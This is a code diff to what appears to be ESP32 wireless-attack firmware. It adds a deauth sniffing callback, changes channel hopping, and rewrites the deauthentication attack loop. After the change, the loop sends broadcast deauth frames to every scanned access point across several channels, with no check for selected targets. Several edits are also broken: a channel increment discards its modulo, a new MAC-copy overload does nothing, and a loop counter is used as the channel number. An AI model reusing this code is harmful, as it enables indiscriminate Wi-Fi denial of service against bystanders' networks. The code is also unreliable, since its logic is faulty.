@@ -190,6 +190,11 @@ void WiFiModule::Sniff(SniffType Type, int TargetChannel)
 #endif
       break;
     }
+    case SniffType::ST_Deauth:
+    {
+      esp_wifi_set_promiscuous_rx_cb(&deauthapSnifferCallback);
+      break;
+    }
   }
   
   static unsigned long lastChangeTime = 0;
@@ -208,8 +213,10 @@ void WiFiModule::Sniff(SniffType Type, int TargetChannel)
     {
       if (!SetChannel)
       {
-        uint8_t set_channel = random(1, 13);
+        set_channel += 1;
+        set_channel = set_channel % 13; 
         esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
+        Serial.printf("Set Scanning Channel to %i\n", set_channel);
       }
       lastChangeTime = currentTime;
 #ifdef OLD_LED
@@ -244,6 +251,7 @@ void WiFiModule::Scan(ScanType type)
         this->wifi_initialized = true;
         initTime = millis();
         static unsigned long lastChangeTime = 0;
+        static int lastchannel = 0;
 
       while (wifi_initialized)
       {
@@ -253,9 +261,10 @@ void WiFiModule::Scan(ScanType type)
           break;
         }
         unsigned long currentTime = millis();
-        if (currentTime - lastChangeTime >= 3000)
+        if (currentTime - lastChangeTime >= 2000)
         {
-          uint8_t set_channel = random(1, 13);
+          lastchannel++ % 13;
+          uint8_t set_channel = lastchannel;
           esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
           lastChangeTime = currentTime;
         }
@@ -282,6 +291,7 @@ void WiFiModule::Scan(ScanType type)
       this->wifi_initialized = true;
       initTime = millis();
       static unsigned long lastChangeTime = 0;
+      static int lastchannel = 0;
 
       while (this->wifi_initialized)
       {
@@ -291,9 +301,10 @@ void WiFiModule::Scan(ScanType type)
           break;
         }
         unsigned long currentTime = millis();
-        if (currentTime - lastChangeTime >= 3000)
+        if (currentTime - lastChangeTime >= 2000)
         {
-          uint8_t set_channel = random(1, 13);
+          lastchannel++ % 13;
+          uint8_t set_channel = lastchannel;
           esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
           lastChangeTime = currentTime;
         }
@@ -320,6 +331,10 @@ void WiFiModule::LaunchEvilPortal()
 
 void WiFiModule::getMACatoffset(char *addr, uint8_t* data, uint16_t offset) {
   sprintf(addr, "%02x:%02x:%02x:%02x:%02x:%02x", data[offset+0], data[offset+1], data[offset+2], data[offset+3], data[offset+4], data[offset+5]);
+}
+
+void WiFiModule::getMACatoffset(uint8_t *addr, uint8_t* data, uint16_t offset) {
+  {data[offset+0], data[offset+1], data[offset+2], data[offset+3], data[offset+4], data[offset+5];};
 }
 
 int WiFiModule::ClearList(ClearType type)
@@ -575,14 +590,13 @@ SystemManager::getInstance().rgbModule->breatheLED(SystemManager::getInstance().
         }
         for(int i = 0; i < access_points->size(); i++){
         AccessPoint ap = access_points->get(i);
-        if (ap.selected) {
-          for (int i = 0; i < ap.stations->size(); i++) {
-            Station cur_sta = stations->get(ap.stations->get(i));
-              for (int y = 0; y < 25; y++) {
-                sendDeauthFrame(ap.bssid, ap.channel, cur_sta.mac);
+        for (int x = 0; x < ap.stations->size(); x++) {
+            Station cur_sta = stations->get(ap.stations->get(x));
+              for (int y = 0; y < 12; y++) {
+                uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};      
+                sendDeauthFrame(ap.bssid, y, broadcast_mac);
               }
             }
-          }
 #ifdef OLD_LED
 SystemManager::getInstance().rgbModule->breatheLED(SystemManager::getInstance().rgbModule->redPin, 100);
 #endif
@@ -720,7 +734,7 @@ void WiFiModule::broadcastRandomSSID() {
 }
 
 void WiFiModule::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]) {
-  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+ esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
   delay(1);
   
   // Build AP source packet
